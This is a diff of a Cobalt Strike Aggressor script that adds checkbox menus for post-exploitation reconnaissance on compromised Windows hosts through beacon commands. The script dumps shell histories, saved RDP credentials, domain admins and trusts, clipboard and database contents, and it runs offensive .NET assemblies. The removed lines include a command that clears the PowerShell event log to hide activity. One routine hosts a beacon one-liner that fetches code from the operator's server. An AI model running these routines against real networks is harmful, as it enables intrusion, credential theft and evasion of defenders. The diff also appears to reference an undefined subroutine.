@@ -9,158 +9,463 @@
 ##############################
 menu "Information Discovery" {
 
-				item "Get QQ Login History" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
-			}
-		}	
-				item "Get RDP Port" {
-            local('$bid');
-            foreach $bid ($1){
-                blog($1, "Check Rdp Open Port");
-                bpowershell_import($bid, script_resource("/script/RegRdpPort.ps1"));
-                bpowerpick($bid,"RegRdpPort");
-                bshell($bid,"wevtutil cl \"Windows PowerShell\"");
-                }
-            }
-				item "CMD History" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "doskey /history");
-			}
-		}
-				item "PowerShell History" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
-			}
-		}
-				item "Recent Files" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
-			}
-		}		
-				item "Check SMB Path" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic share get name,path");
-			}
-		}
-				item "List of All Installed Programs" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic product list brief");
-			}
-		}
-				item "Hotfix Information" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic qfe  get hotfixid");
-			}
-		}
-				item "Tasklist" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "wmic process get caption,commandline,processid /value");
-			}
-		}
-				item "Check Services" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net start");
-			}
-		}
-				item "Firewall Configs" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "netsh firewall show config");
-			}
-		}
-				item "List Domain Admin" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net group \"domain admins\" /domain");
-			}
-		}
+        item "Basic Info"{
+            $bid = $1['@'];
+            $dialog = dialog("Basic Info",%(bid => $bid), &main);
+            dialog_description($dialog, "Gather host informations.");
+            drow_checkbox($dialog, "QQ", "QQ Log", "");
+            drow_checkbox($dialog, "SharpChassisType", "Host Type", "");
+            drow_checkbox($dialog, "cmd", "CMD history", "");
+            drow_checkbox($dialog, "powershell", "Powershell History", "");
+            drow_checkbox($dialog, "recenttest", "Recent", "");
+            drow_checkbox($dialog, "recent_ladon", "Recent-ladon", "");
+            drow_checkbox($dialog, "smb", "SMB Path", "");
+            drow_checkbox($dialog, "brief", "WMIC Info", "");
+            drow_checkbox($dialog, "hotfixid", "Hotfix Info", "");
+            drow_checkbox($dialog, "process", "Process", "");
+            drow_checkbox($dialog, "processid", "Process Details", "");
+            drow_checkbox($dialog, "start", "Service", "");
+            drow_checkbox($dialog, "firewall", "MS Firewall Config", "");
+            drow_checkbox($dialog, "schtasks_exe", "Task Schedule", "");
+            drow_checkbox($dialog, "schtasks", "Task Schedule Details", "");
+            drow_checkbox($dialog, "database", "Looking for Database", "");
+            drow_checkbox($dialog, "workstation", "Uptime", "");
+            drow_checkbox($dialog, "startup", "Startup", "");
+            drow_checkbox($dialog, "qwinsta", "Online User", "");
+            drow_checkbox($dialog, "GetIP", "Show IP", "");
+            dbutton_action($dialog, "RUN");
+            dialog_show($dialog);
+        }
+		
 
-				item "systeminfo" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "systeminfo");
-			}
-		}
-				item "mstsc History" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "cmdkey /list");
-			}
-		}
-				item "List all domains and workgroups in the network" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "net view /domain");
-			}
-		}
-			    item "List all hosts in the domian" {
-             prompt_text("domain?", "", lambda({
-            bshell(@ids, "net view /DOMAIN:$1");
-        }, @ids => $1));
+        item "Initial Info"{
+            $bid = $1['@'];
+            $dialog = dialog("Initial Info",%(bid => $bid), &neiwang);
+            dialog_description($dialog, "Initial Information Gathering");
+            drow_checkbox($dialog, "view_domain", "Show Domain", "");
+            drow_checkbox($dialog, "domainadmin", "Domain Admin", "");
+            drow_checkbox($dialog, "route_print", "Print Route", "");
+            drow_checkbox($dialog, "domain_sid", "Domain SID", "");
+            drow_checkbox($dialog, "domain_user", "Domain User", "");
+            drow_checkbox($dialog, "domain_workstation", "Domain Workstation", "");
+            drow_checkbox($dialog, "domain_time", "Domain Time", "");
+            drow_checkbox($dialog, "domain_computer", "Domain Computer", "");
+            drow_checkbox($dialog, "domain_group", "Domain Group", "");
+            drow_checkbox($dialog, "domain_computers", "Computers in All Domain", "");
+            drow_checkbox($dialog, "domain_accounts", "Domain Accounts", "");
+            drow_checkbox($dialog, "domain_trusts", "Domain Trusts", "");
+            drow_checkbox($dialog, "domain_dcname", "Domain dcname", "");
+            drow_checkbox($dialog, "domain_dcldap", "Domain dcldap", "");
+            drow_checkbox($dialog, "domain_dcgroup", "Domain dcgroup", "");
+            drow_checkbox($dialog, "domain_dcdc", "Domain dcdc", "");
+            drow_checkbox($dialog, "domain_dcuser", "Domain dcuser", "");
+            drow_checkbox($dialog, "domain_dcuserwmi", "Domain dcuserwmi", "");
+            drow_checkbox($dialog, "domain_dcadministrators", "Domain dcadministrators", "");
+            drow_checkbox($dialog, "domain_online", "Domain online", "");
+            dbutton_action($dialog, "RUN");
+            dialog_show($dialog);
+        }
+
+sub main{
+    foreach $func (keys($3)){
+        if ($3[$func] eq 'true'){
+            eval($func.'();');
+        }
     }
-	        item "SharpEventLog" {
-			$bid = $1;
-			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
-			dialog_description($dialog, "Read EventLog: Get all login attempts(4624,4625). Locate system manager.");
-			drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
-        }
-sub SharpEventLog {
-	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
+
 }
-			item "SharpWebScan" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
-			dialog_description($dialog, "Scan common web ports");
-			drow_text($dialog, "ip", "ip:  ");	
-			drow_text($dialog, "port", "ports:  ");			
-			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
+
+sub neiwang{
+    foreach $func (keys($3)){
+        if ($3[$func] eq 'true'){
+            eval($func.'();');
         }
-sub SharpWebScan {
-	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
-	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
+    }
+
 }
-			item "SharpCheckInfo" {
-			$bid = $1;
-			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
-			dialog_description($dialog, "Gather local informations, including environmental variables, recent files, recycle bin, etc..");
-			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
-        }
-sub SharpCheckInfo {
-	bexecute_assembly($bid, script_resource("/script/SharpCheckInfo.exe"), $3['Type']);
+
+sub QQ{
+    btask($bid, "####################", "");
+    btask($bid, "##  Get QQ Info   ##", "");
+	btask($bid, "####################", "");
+    bshell($bid, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
 }
-			item "SharpSQLDump" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
-			dialog_description($dialog, "Get database info of db, table, colunm names. Works on MySQL, MSSQL。");
-			drow_text($dialog, "host", "host:  ");	
-			drow_text($dialog, "username", "username:  ");	
-			drow_text($dialog, "password", "password:  ");			
-			drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
-            dbutton_action($dialog, "RUN");
-			dialog_show($dialog);
+
+sub SharpChassisType{
+    btask($bid, "########################", "");
+    btask($bid, "##    System Type     ##", "");
+	btask($bid, "########################", "");
+    bexecute_assembly($bid, script_resource("/script/SharpChassisType.exe"), "");
+}
+
+sub cmd{
+    btask($bid, "########################", "");
+    btask($bid, "##     CMD History    ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "doskey /history");
+}
+
+sub powershell{
+    btask($bid, "#############################", "");
+    btask($bid, "##    Powershell History   ##", "");
+	btask($bid, "#############################", "");
+    bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+}
+
+sub recenttest{
+    btask($bid, "#######################", "");
+    btask($bid, "##       Recent      ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
+}
+
+sub recent_ladon{
+    btask($bid, "#######################", "");
+    btask($bid, "##  Recent by ladon  ##", "");
+	btask($bid, "#######################", "");
+    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "Recent");
+}
+
+sub smb{
+    btask($bid, "########################", "");
+    btask($bid, "##      SMB Path     ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "wmic share get name,path");
+}
+
+sub brief{
+    btask($bid, "#############################", "");
+    btask($bid, "##        WMIC Info        ##", "");
+	btask($bid, "#############################", "");
+    bshell($bid, "wmic product get name,version");
+}
+
+sub hotfixid{
+    btask($bid, "#####################", "");
+    btask($bid, "##   Hotfix List   ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
+}
+
+sub process{
+    btask($bid, "#####################", "");
+    btask($bid, "##   Process List  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "wmic process get caption,executablepath,commandline");
+}
+
+sub processid{
+    btask($bid, "#####################", "");
+    btask($bid, "## Process Details ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "wmic process get caption,commandline,processid /value");
+}
+
+sub start{
+    btask($bid, "###############", "");
+    btask($bid, "##  Services ##", "");
+	btask($bid, "###############", "");
+    bshell($bid, "wmic service list brief");
+}
+
+sub firewall{
+    btask($bid, "#######################", "");
+    btask($bid, "##  Firewall Config  ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "netsh firewall show config");
+}
+
+sub schtasks_exe{
+    btask($bid, "#####################", "");
+    btask($bid, "##  Task Schedule  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "schtasks.exe");
+}
+
+sub schtasks{
+    btask($bid, "########################", "");
+    btask($bid, "##  Schtasks Details  ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "schtasks /query /fo LIST /v");
+}
+
+sub database{
+    btask($bid, "#########################", "");
+    btask($bid, "##  Possible Database  ##", "");
+	btask($bid, "#########################", "");
+    prompt_text("Webroot:", "", lambda({
+    bshell(@bid, "dir / a / s / b \"$1\ * config *\"");
+        }, @bid => $bid));
+}
+
+sub workstation{
+    btask($bid, "###################", "");
+    btask($bid, "##     Uptime    ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "net statistics workstation");
+}
+
+sub startup{
+    btask($bid, "#######################", "");
+    btask($bid, "##     WMIC Info     ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "wmic startup get command,caption");
+}
+
+sub qwinsta{
+    btask($bid, "###################", "");
+    btask($bid, "##  Online User  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "query user || qwinsta");
+}
+
+sub GetIP{
+    btask($bid, "########################", "");
+    btask($bid, "##  IP for LAN & WAN  ##", "");
+	btask($bid, "########################", "");
+    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "GetIP");
+}
+
+
+######################################################################################################################
+
+sub view_domain{
+    btask($bid, "###################", "");
+    btask($bid, "##  Show Domain  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "net view /domain");
+}
+
+sub domainadmin{
+    btask($bid, "####################", "");
+    btask($bid, "##  Domain Admin  ##", "");
+	btask($bid, "####################", "");
+    bshell($bid, "net group \"domain admins\" /domain");
+}
+
+sub route_print{
+    btask($bid, "###################", "");
+    btask($bid, "##  Print Route  ##", "");
+	btask($bid, "###################", "");
+    bshell($bid, "route print");
+}
+
+sub domain_sid{
+    btask($bid, "##################", "");
+    btask($bid, "##  Domain SID  ##", "");
+	btask($bid, "##################", "");
+    bshell($bid, "whoami /all");
+}
+
+sub domain_user{
+    btask($bid, "###################", "");
+    btask($bid, "##  Domain User  ##", "");
+	btask($bid, "###################", "");
+    prompt_text("Insert domain username", "", lambda({
+    bshell(@bid, "net user $1 /domain");
+        }, @bid => $bid));
+}
+
+sub domain_workstation{
+    btask($bid, "##########################", "");
+    btask($bid, "##  Domain Workstation  ##", "");
+	btask($bid, "##########################", "");
+    bshell($bid, "net config workstation");
+}
+
+sub domain_time{
+    btask($bid, "########################################", "");
+    btask($bid, "##  Domain Time (to get main domain)  ##", "");
+	btask($bid, "########################################", "");
+    bshell($bid, "net time /domain");
+}
+
+sub domain_computer{
+    btask($bid, "#########################", "");
+    btask($bid, "##   Domain Computer  ##", "");
+	btask($bid, "#########################", "");
+    prompt_text("Insert computer name:", "", lambda({
+    bshell(@bid, "net view /domain:$1");
+        }, @bid => $bid));
+}
+
+sub domain_group{
+    btask($bid, "####################", "");
+    btask($bid, "##  Domain Group  ##", "");
+	btask($bid, "####################", "");
+    bshell($bid, "net group /domain");
+}
+
+sub domain_computers{
+    btask($bid, "###############################", "");
+    btask($bid, "##  Computers in All Domain  ##", "");
+	btask($bid, "###############################", "");
+    bshell($bid, "net group \"domain computers\" /domain");
+}
+
+sub domain_accounts{
+    btask($bid, "#######################", "");
+    btask($bid, "##  Domain Accounts  ##", "");
+	btask($bid, "#######################", "");
+    bshell($bid, "net accounts /domain");
+}
+
+sub domain_trusts{
+    btask($bid, "######################", "");
+    btask($bid, "##  Domain Trusts  ##", "");
+	btask($bid, "#####################", "");
+    bshell($bid, "nltest /domain_trusts");
+}
+
+sub domain_dcname{
+    btask($bid, "######################", "");
+    btask($bid, "##  Domain dcname   ##", "");
+	btask($bid, "######################", "");
+    prompt_text("Insert hostname: ", "", lambda({
+    bshell(@bid, "nltest /DCLIST:$1");
+        }, @bid => $bid));
+}
+
+sub domain_dcldap{
+    btask($bid, "######################", "");
+    btask($bid, "##  Domain dcldap   ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "Nslookup -type=SRV _ldap._tcp");
+}
+
+sub domain_dcgroup{
+    btask($bid, "######################", "");
+    btask($bid, "##  Domain dcgroup  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "net group \"Domain Controllers\" /domain");
+}
+
+sub domain_dcdc{
+    btask($bid, "######################", "");
+    btask($bid, "##   Domain dcdc   ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "netdom query pdc");
+}
+
+sub domain_dcuser{
+    btask($bid, "######################", "");
+    btask($bid, "##   Domain Users  ##", "");
+	btask($bid, "######################", "");
+    bshell($bid, "net user /domain");
+}
+
+sub domain_dcuserwmi{
+    btask($bid, "########################", "");
+    btask($bid, "##  Domain dcuserwmi  ##", "");
+	btask($bid, "########################", "");
+    bshell($bid, "wmic useraccount get /all");
+}
+
+sub domain_dcadministrators{
+    btask($bid, "###############################", "");
+    btask($bid, "##  Domain dcadministrators  ##", "");
+	btask($bid, "###############################", "");
+    bshell($bid, "net localgroup administrators /domain");
+}
+
+sub domain_online{
+    btask($bid, "###########################", "");
+    btask($bid, "##  Domain online hosts  ##", "");
+	btask($bid, "###########################", "");
+    bshell($bid, "net view");
+}
+
+menu "MSTSC History"{
+    item "Looking for all users history"{
+        $bid = $1['@'];
+        $Dialog = dialog("listlog",%(bid => $bid),&listlogs);
+        dialog_description($Dialog, "Mstsc");
+        dbutton_action($Dialog, "RUN");
+        dialog_show($Dialog);
+    }
+
+    sub listlogs {
+    	local('$script');
+
+    	$oneliner = beacon_host_script($bid);
+
+    	bpowershell_import!($bid, script_resource("/script/ListAllUsers.ps1"));
+    	bpowerpick!($bid, "\" $+ $oneliner $+ \"");
+
+    	bpause($bid, 10000);
+
+    }
+
+    item "Looking for login-users history"{
+        $bid = $1['@'];
+        $Dialog = dialog("listlog",%(bid => $bid),&listlog);
+        dialog_description($Dialog, "Mstsc");
+        dbutton_action($Dialog, "RUN");
+        dialog_show($Dialog);
+    }
+}
+
+    item "SharpEventLog" {
+    	$bid = $1;
+    	$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
+    	dialog_description($dialog, "Read EventLog: Get all login attempts(4624,4625). Locate system manager.");
+    	drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
+        dbutton_action($dialog, "RUN");
+    	dialog_show($dialog);
+    }
+
+    sub SharpEventLog {
+    	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
+    }
+
+    item "SharpWebScan" {
+    	$bid = $1['@'];
+    	$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
+    	dialog_description($dialog, "Scan common web ports");
+    	drow_text($dialog, "ip", "ip:  ");	
+    	drow_text($dialog, "port", "ports:  ");			
+    	drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+        dbutton_action($dialog, "RUN");
+    	dialog_show($dialog);
+    }
+
+    sub SharpWebScan {
+    	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+    	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
+    }
+
+	item "SharpCheckInfo" {
+		$bid = $1;
+		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
+        dialog_description($dialog, "Gather local informations, including environmental variables, recent files, recycle bin, etc..");
+		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
+        dbutton_action($dialog, "RUN");
+		dialog_show($dialog);
         }
-sub SharpSQLDump {
-		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
-		bexecute_assembly($bid, script_resource("/script/SharpSQLDump.exe"), $arg);
-}	
-		item "SharpClipHistory" {
-			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
-		}	
+
+    sub SharpCheckInfo {
+    	bexecute_assembly($bid, script_resource("/script/SharpCheckInfo.exe"), $3['Type']);
+    }
+
+	item "SharpSQLDump" {
+		$bid = $1['@'];
+		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
+		dialog_description($dialog, "Get database info of db, table, colunm names. Works on MySQL, MSSQL。");
+		drow_text($dialog, "host", "host:  ");	
+		drow_text($dialog, "username", "username:  ");	
+		drow_text($dialog, "password", "password:  ");			
+		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
+        dbutton_action($dialog, "RUN");
+		dialog_show($dialog);
+    }
+
+    sub SharpSQLDump {
+    	$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
+    	bexecute_assembly($bid, script_resource("/script/SharpSQLDump.exe"), $arg);
+    }
+
+	item "SharpClipHistory" {
+		bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
+	}	
 			
-	}
+}
